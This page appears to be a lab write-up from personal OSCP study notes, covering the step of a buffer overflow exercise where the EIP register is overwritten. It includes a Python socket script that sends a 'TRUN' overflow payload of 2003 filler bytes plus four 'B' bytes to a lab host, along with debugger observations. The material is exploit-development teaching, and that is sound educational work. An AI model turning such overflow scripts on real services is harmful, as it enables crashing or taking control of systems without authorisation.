---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/buffer-overflow/bof-tcm/4-overwriting-eip
---

# 4- Overwriting EIP

**Overwriting the EIP:** We use that offset to overwrite the EIP that pointer address.

Now, we're trying to overwrite the EIP. We have found that the offset value is **2003 bytes**. That's mean there's 2003 bytes right before you get to the EIP and the EIP itself is **4 bytes** long. We're going to overwrite those exact specific **4 bytes.**

Let create another python script to overwrite the EIP value by **42424242 (BBBB)**

{% code title="3-offset1.py" %}
```python
//python3 3-offset1.py


#!/usr/bin/python3

import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	//Change This IP address and Port
	s.connect(('192.168.30.131',9999))

	payload = "TRUN /.:/" + shellcode

	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```
{% endcode %}

Try to run the payload offset1.py and notice that there's no error. As well as, the immunity debug blink and **Access Violation**.

<figure><img src="../../../../../../.gitbook/assets/image (252).png" alt=""><figcaption></figcaption></figure>

Check the value **EBP** contain **41414141 (AAAA)** and notice **EIP** contain value **42424242 (BBBB)**.

We have sent only **4 bytes of B** and they all landed in **EIP**. That is mean we control this EIP.

<figure><img src="../../../../../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

